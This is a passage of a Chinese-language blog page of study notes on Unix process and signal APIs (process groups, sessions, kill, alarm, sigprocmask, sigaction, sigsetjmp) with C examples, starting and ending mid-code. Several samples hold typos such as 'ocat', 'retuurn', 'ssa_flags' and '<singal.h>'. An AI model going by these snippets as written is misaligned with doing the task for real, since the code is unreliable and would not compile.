*cmdstring)</span>;<br></code></pre></td></tr></table></figure><h1 id="用户识别"><a href="#用户识别" class="headerlink" title="用户识别"></a>用户识别</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">getlogin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h1><p>获取调度优先级</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">nice</span><span class="hljs-params">(<span class="hljs-type">int</span> incr)</span>;<br></code></pre></td></tr></table></figure><p>获取一组进程的调度优先级</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getpriority</span><span class="hljs-params">(<span class="hljs-type">int</span> which, <span class="hljs-type">id_t</span> who)</span>;<br></code></pre></td></tr></table></figure><p>设置进程的调用优先级</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">setpriority</span><span class="hljs-params">(<span class="hljs-type">int</span> which, <span class="hljs-type">id_t</span> who, <span class="hljs-type">int</span> value)</span>;<br></code></pre></td></tr></table></figure><h1 id="进程时间"><a href="#进程时间" class="headerlink" title="进程时间"></a>进程时间</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/times.h&gt;</span></span><br><span class="hljs-type">clock_t</span> <span class="hljs-title function_">times</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tms *buf)</span>;<br></code></pre></td></tr></table></figure><h1 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h1><p>获取进程组id</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpgrp</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回调用进程的进程组id</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span>; <span class="hljs-comment">//pid为0则代表当前进程</span><br></code></pre></td></tr></table></figure><p>加入或创建组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">pid_t</span> pgid)</span>;<br></code></pre></td></tr></table></figure><h1 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h1><h2 id="setsid"><a href="#setsid" class="headerlink" title="setsid"></a>setsid</h2><p>建立会话</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">setsid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回进程组ID</span><br></code></pre></td></tr></table></figure><h2 id="getsid"><a href="#getsid" class="headerlink" title="getsid"></a>getsid</h2><p>获取会话id</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getsid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span>; <span class="hljs-comment">//返回会话领导的进程组ID</span><br></code></pre></td></tr></table></figure><h2 id="tcgetpgrp-tcsetpgrp-and-tcgetsid"><a href="#tcgetpgrp-tcsetpgrp-and-tcgetsid" class="headerlink" title="tcgetpgrp,tcsetpgrp and tcgetsid"></a>tcgetpgrp,tcsetpgrp and tcgetsid</h2><p>获取前台进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">tcgetpgrp</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>; <span class="hljs-comment">//返回与打开终端返回的fd描述符相关的前台进程组</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tcsetpgrp</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">pid_t</span> pgrpid)</span>;<span class="hljs-comment">//设置控制终端的进程组ID</span><br></code></pre></td></tr></table></figure><p>通过<code>TTY</code>文件获取会话负责人的进程组ID</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">tcgetsid</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>; <span class="hljs-comment">//返回会话领导人的进程组ID</span><br></code></pre></td></tr></table></figure><h1 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h1><p>信号处理函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">void</span> (*signal(<span class="hljs-type">int</span> signo, <span class="hljs-type">void</span> (*func)(<span class="hljs-type">int</span>)))(<span class="hljs-type">int</span>);<br></code></pre></td></tr></table></figure><ul><li>参数<code>func</code><ul><li><code>SIG_IGN</code>忽略信号</li><li><code>SIG_DFL</code>默认值操作</li><li>函数地址，自定义操作</li></ul></li></ul><h1 id="kill和raise"><a href="#kill和raise" class="headerlink" title="kill和raise"></a>kill和raise</h1><p><code>kill</code>函数用于给进程与进程组发送信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">int</span> signo)</span>;<br><span class="hljs-meta">#raise = kill(getpid(),signo);</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">raise</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span>;<br><span class="hljs-comment">//若成功，返回0; 若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>pid &gt; 0</code>，发送的进程<code>ID</code>为<code>pid</code></li><li><code>pid == 0</code>，向该进程组所有进程发送信号</li><li><code>pid &lt; 0</code>，向指定的进程组发送信号</li><li><code>pid == -1</code>，向系统所有进程发送信号</li></ul><h1 id="alarm和pause"><a href="#alarm和pause" class="headerlink" title="alarm和pause"></a>alarm和pause</h1><p><code>alarm</code>允许设置一个计时器，当计时器到期时，生成<code>SIGALRM</code>信号。默认操作是终止进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">alarm</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seconds)</span>;<br></code></pre></td></tr></table></figure><p><code>pause</code>函数暂停调用过程，直到捕捉到信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pause</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="信号设置"><a href="#信号设置" class="headerlink" title="信号设置"></a>信号设置</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigemptyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>; <span class="hljs-comment">//清空信号集</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>; <span class="hljs-comment">//初始化信号集</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigaddset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-type">int</span> signo)</span>;<span class="hljs-comment">//添加单个信号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigdelset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-type">int</span> signo)</span>;<span class="hljs-comment">//删除单个信号</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>:<span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br><span class="hljs-type">int</span> sigismember(conset <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-type">int</span> signo);<span class="hljs-comment">//判断signo信号是否被设置，是返回1，否返回0</span><br></code></pre></td></tr></table></figure><h2 id="sigprocmask"><a href="#sigprocmask" class="headerlink" title="sigprocmask"></a>sigprocmask</h2><p>用于修改信号掩码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *<span class="hljs-keyword">restrict</span> oset)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>oset</code>用于存储当前进程的信号掩码</li><li><code>set</code>若不为空，则<code>how</code>参数指示当前信号掩码如何修改</li><li><code>how</code>参数选项如下<ul><li><code>SIG_BLOCK</code>：<code>set</code>指向需要阻塞的信号</li><li><code>SIG_UNBLOCK</code>：<code>set</code>指向需要解除的信号</li><li><code>SIG_SETMASK</code>：新信号的掩码被<code>set</code>替换</li></ul></li></ul><h2 id="sigpending"><a href="#sigpending" class="headerlink" title="sigpending"></a>sigpending</h2><p><code>sigpending</code>函数用于返回被阻塞的信号或者等待被调用的信号集，返回的信号集存放在<code>set</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigpending</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br>Ruturns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><strong>例子</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sig_quit</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">sigset_t</span> newmask, oldmask, pendmask;<br><span class="hljs-keyword">if</span> (signal(SIGQUIT, sig_quit) == SIG_ERR) <span class="hljs-comment">//注册信号</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t catch SIGQUIT&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>sigemptyset(&amp;newmask); <span class="hljs-comment">//清空信号集</span><br>sigaddset(&amp;newmask, SIGQUIT); <span class="hljs-comment">//增加SIGQUIT信号</span><br><span class="hljs-keyword">if</span> (sigprocmask(SIG_BLOCK, &amp;newmask, &amp;oldmask) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//阻止newmask中的信号集，当前进程的信号集存放在oldmask中</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;SIG_BLOCK error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>sleep(<span class="hljs-number">5</span>);<br><span class="hljs-keyword">if</span> (sigpending(&amp;pendmask) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//捕获被挂起的信号集，得到的信号集存放在pendmask中</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;sigpending error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (sigismember(&amp;pendmask, SIGQUIT)) <span class="hljs-comment">//确定SIGQUIT在pendmask中</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nSIGQUIT pending\n&quot;</span>);<br><span class="hljs-keyword">if</span> (sigprocmask(SIG_SETMASK, &amp;oldmask, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//将信号集还原为oldmask</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;SIG_SETMASK error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIGQUIT unblocked\n&quot;</span>);<br>sleep(<span class="hljs-number">5</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">sig_quit</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;caught SIGQUIT\n&quot;</span>);<br><span class="hljs-keyword">if</span> (signal(SIGQUIT, SIG_DFL) == SIG_ERR)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t reset SIGQUIT&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sigaction"><a href="#sigaction" class="headerlink" title="sigaction"></a>sigaction</h2><p>用于检查或修改特定信号相关动作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigaction</span><span class="hljs-params">(<span class="hljs-type">int</span> signo, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sigaction *<span class="hljs-keyword">restrict</span> act,<span class="hljs-keyword">struct</span> sigaction *<span class="hljs-keyword">restrict</span> oact)</span>;<br>Retruns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><ul><li><code>signo</code>为正在检查或修改动作的信号</li><li><code>act</code>为修改的动作</li><li><code>oact</code>为原先的动作</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span>&#123;</span><br><span class="hljs-type">void</span> (*sa_handler)(<span class="hljs-type">int</span>); <span class="hljs-comment">//信号处理函数</span><br>    <span class="hljs-type">sigset_t</span> sa_mask; <span class="hljs-comment">//需要处理的信号集</span><br>    <span class="hljs-type">int</span> sa_flags;<br>    <span class="hljs-type">void</span> (*sa_sigaction)(<span class="hljs-type">int</span>, <span class="hljs-type">siginfo_t</span> *, <span class="hljs-type">void</span> *);<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">siginfo</span> &#123;</span><br><span class="hljs-type">int</span> si_signo; <span class="hljs-comment">/* signal number */</span><br><span class="hljs-type">int</span> si_errno; <span class="hljs-comment">/* if nonzero, errno value from errno.h */</span><br><span class="hljs-type">int</span> si_code; <span class="hljs-comment">/* additional info (depends on signal) */</span><br><span class="hljs-type">pid_t</span> si_pid; <span class="hljs-comment">/* sending process ID */</span><br><span class="hljs-type">uid_t</span> si_uid; <span class="hljs-comment">/* sending process real user ID */</span><br><span class="hljs-type">void</span> *si_addr; <span class="hljs-comment">/* address that caused the fault */</span><br><span class="hljs-type">int</span> si_status; <span class="hljs-comment">/* exit value or signal number */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">sigval</span> <span class="hljs-title">si_value</span>;</span> <span class="hljs-comment">/* application-specific value */</span><br><span class="hljs-comment">/* possibly other fields also */</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ucontext_t</span> *uc_link; <span class="hljs-comment">/* pointer to context resumed when */</span><br><span class="hljs-comment">/* this context returns */</span><br><span class="hljs-type">sigset_t</span> uc_sigmask; <span class="hljs-comment">/* signals blocked when this context */</span><br><span class="hljs-comment">/* is active */</span><br><span class="hljs-type">stack_t</span> uc_stack; <span class="hljs-comment">/* stack used by this context */</span><br><span class="hljs-type">mcontext_t</span> uc_mcontext; <span class="hljs-comment">/* machine-specific representation of */</span><br><span class="hljs-comment">/* saved context */</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br>Sigfunc *<br>    <span class="hljs-title function_">signal</span><span class="hljs-params">(<span class="hljs-type">int</span> signo, Sigfunc *func)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">act</span>, <span class="hljs-title">oact</span>;</span><br>    act.sa_handler = func;<br>    sigemptyset(&amp;act.sa_mask);<br>    act.sa_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (signo == SIGALRM)&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SA_INTERRUPT</span><br>        act.ssa_flags |= SA_IINTERRUPT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        act.sa_flags |= SA_RESTART;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (sigaction(signo,&amp;act, &amp;ocat) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(SIG_ERR);<br>    retuurn(ocat.sa_handler);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;singal.h&gt;</span></span><br><br>Sigfunc *<br>    <span class="hljs-title function_">signal_intr</span><span class="hljs-params">(<span class="hljs-type">int</span> signo, Sigfunc *func)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">act</span>, <span class="hljs-title">oact</span>;</span><br>    act.sa_handler = func;<br>    sigemptyset(&amp;act.sa_mask);<br>    act.sa_flags = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SA_INTERRUPT</span><br>    act.sa_flags |= SA_INTERRUPT;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   <span class="hljs-keyword">if</span> (sigaction(signo, &amp;act, &amp;oact) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(SIG_ERR);<br>    <span class="hljs-keyword">return</span>(oact.sa_handler);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sigsetjmp和siglongjmp"><a href="#sigsetjmp和siglongjmp" class="headerlink" title="sigsetjmp和siglongjmp"></a>sigsetjmp和siglongjmp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env,<span class="hljs-type">int</span> savemask)</span>;<br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> called directly,nonzero <span class="hljs-keyword">if</span> returning from a call to siglong jmp<br><span class="hljs-type">void</span> <span class="hljs-title function_">siglongjmp</span><span class="hljs-params">(sigjmp_buf env,<span class="hljs-type">int</span> val)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sig_usr1</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sig_alrm</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">static</span> sigjmp_buf jmpbuf;<br><span class="hljs-type">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> canjump;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (signal(SIGUSR1, sig_usr1) == SIG_ERR)<br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span 